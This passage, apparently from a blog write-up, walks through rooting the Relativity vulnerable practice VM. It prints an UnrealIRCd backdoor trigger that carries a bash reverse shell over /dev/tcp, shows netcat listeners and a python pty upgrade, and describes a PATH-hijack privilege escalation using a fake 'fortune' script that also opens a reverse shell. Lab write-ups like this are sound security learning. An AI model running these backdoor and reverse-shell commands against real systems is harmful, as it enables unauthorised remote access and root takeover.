drwxr-xr-x.  <span style=color:#ae81ff>4</span> root  root  4.0K Feb <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2013</span> .
dr-xr-xr-x. <span style=color:#ae81ff>18</span> root  root  4.0K Feb <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2013</span> ..
drwx------.  <span style=color:#ae81ff>4</span> jetta jetta 4.0K Sep <span style=color:#ae81ff>28</span> 10:03 jetta
drwxr-xr-x.  <span style=color:#ae81ff>3</span> mauk  mauk  4.0K Jul  <span style=color:#ae81ff>9</span> 08:55 mauk
</code></pre></div><p>Oh yes! Its working! In a broken kind of way, but it works! To make my life a little easier, I changed the backdoor command to actually give me a back connect bash shell so that I can have a interactive session. Its a time saving thing really. My command to the IRCd was now <code>echo "AB; bash -i >& /dev/tcp/&lt;my machine>/6676 0>&1" | nc 127.0.0.1 6667</code>. On my machine I opened a netcat listener on port 6676 and waited for the session to spawn:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># nc -vnlp 6676</span>
listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>6676</span> ...
connect to <span style=color:#f92672>[</span>&lt;snip&gt;<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>192.168.56.21<span style=color:#f92672>]</span> <span style=color:#ae81ff>53493</span>
bash: no job control in this shell
<span style=color:#f92672>[</span>jetta@Relativity Unreal<span style=color:#f92672>]</span>$
</code></pre></div><p>Great. Now it will be a lot easier to navigate around. Spawing the shell the way I did started me off in <code>/opt/Unreal</code>, which was a directory I previously did not have access to. I poked around here for a bit, trying to see if I missed anything with regards to the IRC setup. Nothing was immediately apparent, so, I moved on to the rest of the machine. More specifically, in <code>jetta</code>&rsquo;s home directory, there was a binary called <code>auth_server</code>, owned by root, but with no suid bit. I attempted to execute the binary, and was greeted by a spinning pipe, and eventually a &lsquo;error(12)&rsquo; after a classic cowsay.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>jetta@Relativity ~<span style=color:#f92672>]</span>$ ls -lah auth_server/auth_server
ls -lah auth_server/auth_server
-rwxr-xr-x <span style=color:#ae81ff>1</span> root root 7.9K Mar  <span style=color:#ae81ff>8</span>  <span style=color:#ae81ff>2013</span> auth_server/auth_server
<span style=color:#f92672>[</span>jetta@Relativity ~<span style=color:#f92672>]</span>$ auth_server/auth_server
auth_server/auth_server
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Checking Certificates...done
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Contacting server, please wait...- ____________________________
/ Windows <span style=color:#ae81ff>2000</span> is out!       <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span>|                            |
<span style=color:#ae81ff>\ </span>-- PC Magazine, April <span style=color:#ae81ff>2013</span> /
 ----------------------------
        <span style=color:#ae81ff>\ </span>  ^__^
         <span style=color:#ae81ff>\ </span> <span style=color:#f92672>(</span>oo<span style=color:#f92672>)</span><span style=color:#ae81ff>\_</span>______
            <span style=color:#f92672>(</span>__<span style=color:#f92672>)</span><span style=color:#ae81ff>\ </span>      <span style=color:#f92672>)</span><span style=color:#ae81ff>\/\
</span><span style=color:#ae81ff></span>                <span style=color:#f92672>||</span>----w |
                <span style=color:#f92672>||</span>     <span style=color:#f92672>||</span>
could not establish connection
error: <span style=color:#f92672>(</span>12<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>jetta@Relativity ~<span style=color:#f92672>]</span>$
</code></pre></div><p>Right&mldr; well that is not exactly very helpful&mldr; or is it? Admittedly, this was the part that cost me the most time. I got lost on a path which is lead by enum->sploit->post, and wandered off into a world of binary analysis, process packet sniffing and eventually reverse engineering. Initially, I somehow figured that <code>auth_server</code> should be running, and <em>should</em> provide the IRCd with NickServ capabilities, so that <em>maybe</em> I could VHOST to a vDomain of a operator account, IDENT as him and then discover other hidden treasures&mldr;</p>
<p>Granted, I did do some basic enum, and figured after I ran <code>id</code> and saw that the account for <code>jetta</code> was not in any fancy groups, there was nothing more to see here.</p>
<p><strong>EVENTUALLY</strong>, after a number of tactical coffees and rethinking of what I have seen so far, I came back to re-attempt this.</p>
<h3 id=the-shortest-straw>the shortest straw<a hidden class=anchor aria-hidden=true href=#the-shortest-straw>#</a></h3>
<p>I reran <code>auth_server</code> a few more times, and decided to push the binary through strings one more time, just to see if <em>maybe</em> the clue will be more clear now:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># strings auth_server</span>
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
fflush
puts
putchar
printf
poll
stdout
system
__libc_start_main
GLIBC_2.2.5
l$ L
t<span style=color:#66d9ef>$(</span>L
|$0H
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Checking Certificates...
<span style=color:#66d9ef>done</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Contacting server, please wait...
could not establish connection
invalid certificates
error: <span style=color:#f92672>(</span>12<span style=color:#66d9ef>)</span>
fortune -s | /usr/bin/cowsay
Starting Auth server..
;*3$<span style=color:#e6db74>&#34;
</span></code></pre></div><p>This did not help me get what I was clearly missing, and so, I went back to the enumeration step. What do I know about my current environment? WHERE do I have access now? WHAT access do I have? Anything different here that I may be missing. Eventually, I tried to so a <code>sudo -l</code>, which should list the commands I am allowed to run with sudo. Because my shells were all build with netcat, I had no proper tty to work with, so, sudo would complain about this. A quick fix with python, and all is well again:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>jetta@Relativity ~<span style=color:#f92672>]</span>$ sudo -l
sudo -l
sudo: sorry, you must have a tty to run sudo
<span style=color:#f92672>[</span>jetta@Relativity ~<span style=color:#f92672>]</span>$ python -c <span style=color:#e6db74>&#34;import pty;pty.spawn(&#39;/bin/sh&#39;);&#34;</span>
python -c <span style=color:#e6db74>&#34;import pty;pty.spawn(&#39;/bin/sh&#39;);&#34;</span>
sh-4.2$ sudo -l
sudo -l
Matching Defaults entries <span style=color:#66d9ef>for</span> jetta on this host:
    requiretty, env_keep<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
</span><span style=color:#e6db74>    LS_COLORS&#34;</span>, env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
</span><span style=color:#e6db74>    LC_CTYPE&#34;</span>, env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
</span><span style=color:#e6db74>    LC_MESSAGES&#34;</span>, env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
</span><span style=color:#e6db74>    LC_TELEPHONE&#34;</span>, env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
</span><span style=color:#e6db74>    XAUTHORITY PATH&#34;</span>, env_reset

User jetta may run the following commands on this host:
    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /home/jetta/auth_server/auth_serveyr
sh-4.2$
</code></pre></div><p>And there it is! <code>auth_server</code> may be run as root with no password requirement! \o/. Immediately I jumped to running <code>sudo /home/jetta/auth_server/auth_server</code>, just to be met with the same fate of &lsquo;error(12)&rsquo;. While playing with the binary earlier, I was however convinced that this error(12) thing was exactly what it was configured to do and nothing more. Yes, thats it. Simply write the &lsquo;Checking Certs&rsquo;, &lsquo;Contacting Server&rsquo; part, then, run <code>fortune -s | /usr/bin/cowsay</code> and error(12).</p>
<p>&mldr; wait a sec. <code>fortune</code> is not called from its full relative path, however /usr/bin/cowsay is. This means if I can fool the binary into thinking something else is this <code>fortune</code> command, then I may be able to root the box. Especially if I can make it think my bash shell is <code>fortune</code> :)</p>
<h3 id=finishing-off>finishing off<a hidden class=anchor aria-hidden=true href=#finishing-off>#</a></h3>
<p>With all the knowledge I have gained now, I moved on to finishing off by rooting the box. This was achieved by firstly creating a script called <code>fortune</code>, which was simply the old bash command pushed over /dev/tcp again, and placing it in <em>/home/jetta/bin</em>. I then ensured that <code>fortune</code> was executable and tested it by just running it alone. It was working fine :)</p>
<p>Next, I have to fool the auth_server binary to think that my new fortune script is in fact the one it was looking for. To do this, I added a path to the PATH env variable, and rehashed the bins. Lastly, I ran <code>auth_server</code> as root, and switched to my last nc listener on port 6677&mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ python -c <span style=color:#e6db74>&#34;import pty;pty.spawn(&#39;/bin/sh&#39;);&#34;</span>
sh-4.2$ export PATH<span style=color:#f92672>=</span>/home/jetta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
&lt;etta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
sh-4.2$ sudo auth_server/auth_server
sudo auth_server/auth_server
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Checking Certificates...done
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Contacting server, please wait...could not establish connection
error: <span style=color:#f92672>(</span>12<span style=color:#f92672>)</span>
</code></pre></div><p><code>auth_server</code> did its usual trick with error(12), however, my netcat listener now had a root prompt \o/</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># nc -lvp 6677</span>
listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>6677</span> ...
192.168.56.21: inverse host lookup failed: Unknown server error : Connection timed out
connect to <span style=color:#f92672>[</span>&lt;snip&gt;<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>192.168.56.21<span style=color:#f92672>]</span> <span style=color:#ae81ff>38267</span>
<span style=color:#f92672>[</span>root@Relativity jetta<span style=color:#f92672>]</span><span style=color:#75715e># id</span>
id
uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>root@Relativity jetta<span style=color:#f92672>]</span><span style=color:#75715e># locate flag.txt</span>
locate flag.txt
/root/flag.txt
<span style=color:#f92672>[</span>root@Relativity jetta<span style=color:#f92672>]</span><span style=color:#75715e># cat /root/flag.txt</span>
cat /root/flag.txt
65afa0e5928b98f7ae283e16df2d43bf
<span style=color:#f92672>[</span>root@Relativity jetta<span style=color:#f92672>]</span><span style=color:#75715e>#</span>
</code></pre></div><p>As you can see, flag.txt was found by simply using the locate command for the file. Because I am now root, I have no troubles reading it, and as such, the challenge was considered completed!</p>
</div>
<footer class=post-footer>
<nav class=paginav>
<a class=prev href=https://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/>
<span class=title>« Prev Page</span>
<br>
<span>dnsfilexfer - yet another take on file transfer via DNS</span>
</a>
<a class=next href=https://leonjza.github.io/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot/>
<span class=title>Next Page »</span>
<br>
<span>Zeus My Adventure with a Infamous Bot</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share slash root slash flag dot txt Solving the Relativity Vulnerable VM on twitter" href="https://twitter.com/intent/tweet/?text=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f11%2f18%2fslash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share slash root slash flag dot txt Solving the Relativity Vulnerable VM on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f11%2f18%2fslash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&title=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM&summary=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f11%2f18%2fslash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share slash root slash flag dot txt Solving the Relativity Vulnerable VM on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f11%2f18%2fslash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&title=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share slash root slash flag dot txt Solving the Relativity Vulnerable VM on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f11%2f18%2fslash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share slash root slash flag dot txt Solving the Relativity Vulnerable VM on whatsapp" href="https://api.whatsapp.com/send?text=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f11%2f18%2fslash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share slash root slash flag dot txt Solving the Relativity Vulnerable VM on telegram" href="https://telegram.me/share/url?text=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f11%2f18%2fslash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>@leonjza</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>